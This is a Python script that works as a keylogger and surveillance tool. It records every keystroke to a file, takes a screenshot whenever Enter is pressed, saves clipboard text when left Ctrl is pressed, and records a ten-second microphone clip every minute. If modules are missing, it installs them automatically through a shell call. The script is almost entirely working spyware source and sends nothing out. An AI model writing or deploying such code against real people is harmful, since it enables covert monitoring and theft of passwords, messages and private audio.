try:
    import os
    import pyperclip
    import pyautogui  # We'll use this to take screenshots
    import sounddevice as sd  # This is for recording audio
    import wave  # This helps us save the recorded audio as a WAV file
    from pynput import keyboard
    from datetime import datetime
    from threading import Timer
except ModuleNotFoundError:
    from subprocess import call
    # If any of these modules are missing, they will be installed automatically
    modules = ["pyperclip", "pyautogui", "sounddevice", "wave", "pynput"]
    call("pip install " + ' '.join(modules), shell=True)

# Audio recording settings
SAMPLE_RATE = 16000  # This is the sample rate for the audio; we can adjust it if needed
DURATION = 10  # We'll record for 10 seconds each time

# Let's see which audio devices are available
print(sd.query_devices())

# If you want to manually select a specific microphone, uncomment and set it here
# sd.default.device = 'Your_Microphone_Device_Name'

def record_audio():
    """This function records audio for the specified duration and saves it as a WAV file."""
    try:
        print("Recording audio...")  # Notify the user that audio recording is in progress
        audio_data = sd.rec(int(DURATION * SAMPLE_RATE), samplerate=SAMPLE_RATE, channels=1)  # Mono recording
        sd.wait()  # Wait for the recording to finish

        # Get the current time for naming the audio file
        current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        audio_filename = f"audio_{current_time}.wav"  # Create the filename with a timestamp

        # Save the recorded audio
        with wave.open(audio_filename, 'wb') as audio_file:
            audio_file.setnchannels(1)
            audio_file.setsampwidth(2)
            audio_file.setframerate(SAMPLE_RATE)
            audio_file.writeframes(audio_data.tobytes())

        print(f"Audio saved as {audio_filename}")  # Notify the user that the audio file is saved
    except Exception as e:
        print(f"Failed to record audio: {e}")  # If anything goes wrong, print the error

def schedule_audio_recording(interval=60):
    """This function schedules audio recordings at regular intervals."""
    record_audio()  # Record right away
    Timer(interval, schedule_audio_recording, [interval]).start()  # Keep recording every 'interval' seconds

def take_screenshot():
    """This function captures a screenshot and saves it with a timestamp."""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")  # Get the current time for the file name
        screenshot = pyautogui.screenshot()  # Take the screenshot
        screenshot.save(f"screenshot_{current_time}.png")  # Save it with a timestamp in the file name
        print(f"Screenshot taken and saved as screenshot_{current_time}.png")  # Let the user know the screenshot was saved
    except Exception as e:
        print(f"Failed to take screenshot: {e}")  # Print the error if something goes wrong

def capture_clipboard():
    """This function captures the current clipboard content."""
    try:
        return pyperclip.paste()  # Get the text currently in the clipboard
    except Exception as e:
        print(f"Failed to capture clipboard: {e}")  # Handle any errors that occur
        return None  # Return None if it fails

def log_data(key):
    """This function logs each keypress into a file."""
    with open("keyfile.txt", 'a') as logkey:
        try:
            if hasattr(key, 'char'):
                logkey.write(key.char)  # Log the actual character if it's a letter/number/symbol
            else:
                logkey.write(f'[{key}]')  # Log special keys like ENTER, SHIFT, etc.
        except Exception as e:
            print(f"Error logging key: {e}")  # Handle any errors

def keyPressed(key):
    """This function is triggered whenever a key is pressed."""
    print(str(key))  # Print the keypress (just for visual confirmation)
    log_data(key)  # Log the keypress

    # If the user presses 'Enter', take a screenshot
    if key == keyboard.Key.enter:
        take_screenshot()

    # If the user presses 'Ctrl+L', capture the clipboard content
    if key == keyboard.Key.ctrl_l:
        clipboard_content = capture_clipboard()
        if clipboard_content:
            with open("clipboard.txt", 'a') as clipkey:
                clipkey.write(f"{clipboard_content}\n")  # Save the clipboard content to a file
                print(f"Clipboard content captured: {clipboard_content}")  # Notify the user

if __name__ == '__main__':
    # Start listening for key presses
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    # Set up the audio recording to happen every 60 seconds (or however often you prefer)
    schedule_audio_recording(interval=60)

    # Keep the program running until the user hits Enter
    input("Press Enter to stop logging.\n")
    listener.stop()